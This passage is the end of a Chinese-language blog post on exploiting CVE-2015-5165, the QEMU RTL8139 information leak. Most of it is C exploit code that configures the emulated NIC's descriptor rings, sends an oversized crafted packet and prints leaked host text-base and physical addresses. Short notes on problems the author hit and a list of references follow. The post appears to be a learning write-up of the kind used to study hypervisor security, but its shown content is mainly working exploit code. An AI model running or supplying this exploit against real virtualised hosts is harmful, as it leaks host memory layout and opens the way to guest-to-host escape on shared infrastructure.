</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=n>ptr</span> <span class=o>+=</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>memory_size</span> <span class=o>=</span> <span class=mh>0x40000000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(((</span><span class=kt>uint64_t</span><span class=p>)</span><span class=n>index</span> <span class=o>|</span> <span class=mh>0x7f0000</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>24</span><span class=p>)</span> <span class=o>-</span> <span class=n>memory_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 44*1500 = 66000 &gt; ip_data_len = 65535
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>size_t</span> <span class=n>rtl8139_rx_nb</span> <span class=o>=</span> <span class=mi>44</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>rtl8139_ring</span> <span class=o>*</span><span class=n>rtl8139_rx_ring</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>rtl8139_desc</span> <span class=o>*</span><span class=n>rtl8139_rx_desc</span><span class=p>,</span> <span class=o>*</span><span class=n>rtl8139_tx_desc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>rtl8139_rx_ring</span> <span class=o>=</span> <span class=p>(</span><span class=n>rtl8139_ring</span> <span class=o>*</span><span class=p>)</span><span class=nf>aligned_alloc</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>PAGE_SIZE</span><span class=p>,</span> <span class=n>rtl8139_rx_nb</span><span class=o>*</span><span class=k>sizeof</span><span class=p>(</span><span class=n>rtl8139_ring</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>rtl8139_rx_desc</span> <span class=o>=</span> <span class=p>(</span><span class=n>rtl8139_desc</span> <span class=o>*</span><span class=p>)</span><span class=nf>aligned_alloc</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>PAGE_SIZE</span><span class=p>,</span> <span class=n>rtl8139_rx_nb</span><span class=o>*</span><span class=k>sizeof</span><span class=p>(</span><span class=n>rtl8139_desc</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>rtl8139_tx_desc</span> <span class=o>=</span> <span class=p>(</span><span class=n>rtl8139_desc</span> <span class=o>*</span><span class=p>)</span><span class=nf>aligned_alloc</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>PAGE_SIZE</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>rtl8139_desc</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=o>*</span><span class=n>rtl8139_tx_buffer</span> <span class=o>=</span> <span class=nf>aligned_alloc</span><span class=p>(</span><span class=n>PAGE_SIZE</span><span class=p>,</span> <span class=n>RTL8139_BUFFER_SIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>iopl</span><span class=p>(</span><span class=mi>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>rtl8139_desc_config_rx</span><span class=p>(</span><span class=n>rtl8139_rx_ring</span><span class=p>,</span> <span class=n>rtl8139_rx_desc</span><span class=p>,</span> <span class=n>rtl8139_rx_nb</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>rtl8139_desc_config_tx</span><span class=p>(</span><span class=n>rtl8139_tx_desc</span><span class=p>,</span> <span class=n>rtl8139_tx_buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>rtl8139_card_config</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nf>rtl8139_packet_send</span><span class=p>(</span><span class=n>rtl8139_tx_buffer</span><span class=p>,</span> <span class=n>packet</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>packet</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>sleep</span><span class=p>(</span><span class=mi>7</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>rtl8139_rx_nb</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// for (int i = 0; i &lt; 2; ++i) {
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nf>xxd</span><span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=n>rtl8139_rx_ring</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>buffer</span><span class=p>,</span> <span class=n>RTL8139_BUFFER_SIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>text_base_addr</span> <span class=o>=</span> <span class=nf>leak_text_base_addr</span><span class=p>(</span><span class=n>rtl8139_rx_ring</span><span class=p>,</span> <span class=n>rtl8139_rx_nb</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Text base address: 0x%llx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>text_base_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>physical_addr</span> <span class=o>=</span> <span class=nf>leak_physical_addr</span><span class=p>(</span><span class=n>rtl8139_rx_ring</span><span class=p>,</span> <span class=n>rtl8139_rx_nb</span><span class=p>);</span>  <span class=c1>// ERROR
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Physical address: 0x%llx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>physical_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=遇到的问题>遇到的问题<a hidden class=anchor aria-hidden=true href=#遇到的问题>#</a></h2><ol><li><code>ifconfig</code>得到的MAC地址是<code>52:54:00:12:34:56</code>，但是<code>rtl8139_do_receive</code>中进行比对时，比对的MAC地址是<code>52:54:00:12:34:57</code>。</li><li>与前人的exploit对比得知，函数的偏移有所变化（如<code>property_get_bool</code>），应该是编译的问题。需要自行查看泄露的数据，进行验证。</li><li>使用<code>scp</code>命令拷贝到客户机，无法拷贝成功。后使用<code>python3 -m http.server</code>进行文件的传输。</li></ol><h2 id=参考>参考<a hidden class=anchor aria-hidden=true href=#参考>#</a></h2><h3 id=misc>misc<a hidden class=anchor aria-hidden=true href=#misc>#</a></h3><ol><li><a href=https://stackoverflow.com/questions/12214746/find-a-commit-on-github-given-the-commit-hash/28053469>git - Find a commit on GitHub given the commit hash - Stack Overflow</a></li><li><a href=https://wiki.osdev.org/RTL8139>RTL8139 - OSDev Wiki</a></li><li><a href=https://zh.m.wikipedia.org/zh-hans/%E4%BB%A5%E5%A4%AA%E7%BD%91%E5%B8%A7%E6%A0%BC%E5%BC%8F>以太网帧格式 - 维基百科，自由的百科全书 (wikipedia.org)</a></li><li><a href=https://www.cnblogs.com/AhuntSun-blog/p/12230694.html>IP 数据报 - AhuntSun - 博客园 (cnblogs.com)</a></li><li><a href=https://blog.csdn.net/zhshulin/article/details/62888061>一张图了解TCP/IP五层网络模型_在路上-CSDN博客</a></li></ol><h3 id=vulnerability>vulnerability<a hidden class=anchor aria-hidden=true href=#vulnerability>#</a></h3><ol><li><a href=https://programlife.net/2020/06/30/cve-2015-5165-qemu-rtl8139-vulnerability-analysis/#more>QEMU 信息泄露漏洞 CVE-2015-5165 分析及利用 | 程序人生 (programlife.net)</a></li><li><a href=http://www.phrack.org/papers/vm-escape-qemu-case-study.html>.:: Phrack Magazine ::. QEMU Case Study</a></li><li><a href=https://github.com/Resery/Virtualized_Learning/tree/master/Vulnerability/CVE-2015-5165>Virtualized_Learning/Vulnerability/CVE-2015-5165 at master · Resery/Virtualized_Learning</a></li><li><a href=https://ray-cp.github.io/archivers/qemu-pwn-cve-2015-5165%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90>qemu-pwn-cve-2015-5165信息泄露漏洞分析 « 纵有寂寂无名时 (ray-cp.github.io)</a></li><li><a href=https://dangokyo.me/2018/03/08/qemu-escape-part-3-information-leakage-cve-2015-5165/>QEMU escape: Part 3 Information Leakage (CVE-2015-5165) – 氷 菓 (dangokyo.me)</a></li></ol></div><footer class=post-footer><ul class=post-tags><li><a href=https://hhdx.xyz/tags/qemu/>Qemu</a></li><li><a href=https://hhdx.xyz/tags/cve/>CVE</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://hhdx.xyz/>hhdx's blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>